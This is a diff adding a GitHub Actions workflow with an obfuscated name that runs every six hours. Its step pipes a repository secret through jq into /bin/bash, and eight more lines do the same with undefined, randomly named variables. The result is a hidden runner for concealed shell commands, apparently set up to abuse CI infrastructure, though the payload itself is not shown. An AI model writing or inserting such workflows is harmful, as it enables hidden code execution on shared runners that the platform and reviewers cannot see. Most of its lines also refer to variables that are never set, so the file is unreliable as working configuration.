@@ -1,0 +1,25 @@
+name: yaokuaiheijunmaa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yaokuaiheijunmaa
+        env:
+          glnco815: ${{ secrets.glnco815 }}
+        run: |
+          echo $glnco815 | jq -r .gcut2 | /bin/bash
+          echo $yfmls3920 | jq -r .u3108 | /bin/bash
+          echo $grrv78819 | jq -r .cgv83209 | /bin/bash
+          echo $awtya2 | jq -r .upzb68 | /bin/bash
+          echo $dna3 | jq -r .cr6181 | /bin/bash
+          echo $pvaz306 | jq -r .ctjo6970 | /bin/bash
+          echo $r8 | jq -r .f704 | /bin/bash
+          echo $gqui4 | jq -r .f45 | /bin/bash
+          echo $ezpr122 | jq -r .ugfv4194 | /bin/bash
+
